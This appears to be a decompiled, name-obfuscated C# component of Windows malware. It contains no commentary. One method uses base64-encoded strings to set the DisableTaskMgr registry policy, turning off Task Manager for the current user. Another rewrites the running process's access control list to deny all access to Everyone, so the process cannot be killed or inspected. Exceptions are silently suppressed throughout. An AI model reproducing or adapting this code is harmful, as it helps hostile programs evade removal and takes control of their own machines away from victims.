using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace WvdSzXINIqX;

internal sealed class zZxyWNJYAkMo
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr eersprczwn, int NVbmnqTmLT, [Out] byte[] KiCrTvfMCpJJ, uint KZpXTVgBQEyXwS, out uint PtgPAnuVktjK);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr MNPUwgTTKirHdUN, int lnLVVjQMNQjLWe, [In] byte[] PpZOHHBUJoWGA);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void sZUDoBTOVmFKt(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(JenwHsdeeXa.XKJIixIieoUFn("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
			registryKey.SetValue(JenwHsdeeXa.XKJIixIieoUFn("RGlzYWJsZVRhc2tNZ3I="), "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor EBKgtLQYYzpgZGI(IntPtr intptr_0)
	{
		byte[] kiCrTvfMCpJJ = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, kiCrTvfMCpJJ, 0u, out var PtgPAnuVktjK);
		if ((long)PtgPAnuVktjK > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, kiCrTvfMCpJJ = new byte[PtgPAnuVktjK], PtgPAnuVktjK, out PtgPAnuVktjK))
		{
			return null;
		}
		return new RawSecurityDescriptor(kiCrTvfMCpJJ, 0);
	}

	private void pGgioADIrOIg(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void vwyzSlmbImtw()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = EBKgtLQYYzpgZGI(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			pGgioADIrOIg(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
